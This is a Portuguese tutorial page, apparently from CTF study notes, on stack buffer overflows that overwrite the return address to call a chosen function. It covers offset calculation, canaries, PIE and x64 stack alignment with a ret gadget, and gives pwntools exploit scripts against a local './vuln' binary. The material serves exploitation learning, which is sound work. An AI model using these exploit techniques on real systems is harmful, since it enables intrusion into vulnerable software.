---
title: "Buffer Overflow - Call Function"
sidebar_position: 2
---

Sobrescrevemos o `return address` com um endereço de nossa escolha, de qualquer lugar do código.

1. Identifique se é possível fazer BOF
2. **Calcule a distância entre o início do input e do endereço de retorno** `rbp+0x8` (x64) ou `ebp+0x4` (x86). Ou use `cyclic(200)` como input e `cyclic_find(valor)` com o valor que apareceu em `[rsp]` no crash
   1. Ex: Se a variável está em `rbp-0x10`, a distância é `0x10 + 0x8 = 0x18`.
3. Em uma string, coloque caracteres para preencher essa distância. Ao final, **adicione o endereço de algum lugar do programa onde você queira executar instruções. Pode ser uma função ou qualquer outra coisa**.

Nota: Em alguns executáveis (compilados com otimização, sem usar `rbp` como base do frame), o `return address` pode não estar em `rbp+0x8`. Sempre verifique no GDB.

Nota 2: Isso só funciona direto se o binário for `No PIE`. Com PIE, os endereços do Ghidra são offsets: é preciso vazar um endereço do binário e somar.

Se tiver Canary: o payload precisa manter o valor do canary (em `rbp-0x8`) intacto. Vaze-o antes (format string, por exemplo) e coloque-o no lugar certo do payload.

```py
from pwn import *
elf = context.binary = ELF('./vuln')
p = process()
payload = b'A' * offset + p64(elf.sym['win'])   # offset = distância até o return address
p.sendline(payload)
p.interactive()
```

## Desalinhamento de Stack (x64)

Se a função alvo chama `system`/`printf` e dá `SIGSEGV` em um `movaps`, a stack está desalinhada (entrar em uma função por `ret` em vez de `call` desloca o `rsp` em 8 bytes). Duas soluções:

### Pular o PUSH RBP (fraco)

- Se você quer ir à função no endereço `0x401234`, use `0x401235`: a instrução `push rbp` ocupa 1 byte, e você a pula. Se a função começa com `endbr64` (4 bytes), use `0x401239`. Confira no GDB qual é o endereço da instrução depois do `push rbp`.

### ROP de ret (recomendado)

- Ache o endereço de um `ret`.
  - Com ROPgadget: `ROPgadget --binary meu_programa | grep ": ret$"`
  - Ou com pwntools:

```py
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Encontra endereço de gadget ret
ret = rop.find_gadget(['ret'])[0]
print(f"Ret gadget: {hex(ret)}")
```

- No buffer overflow, coloque **padding + RET Gadget (endereço) + Função alvo (endereço)**:

```
[RBP-0x20] = AAAA...          (bytes de padding)
[RBP+0x00] = RBP antigo        (8 bytes) 
[RBP+0x08] = RET gadget        ← Colocar Gadget aqui. (RIP vai aqui primeiro)
[RBP+0x10] = Função alvo       ← Colocar função alvo aqui. (RIP vai aqui depois)
```

```py
payload = b'A' * offset + p64(ret) + p64(elf.sym['win'])
```
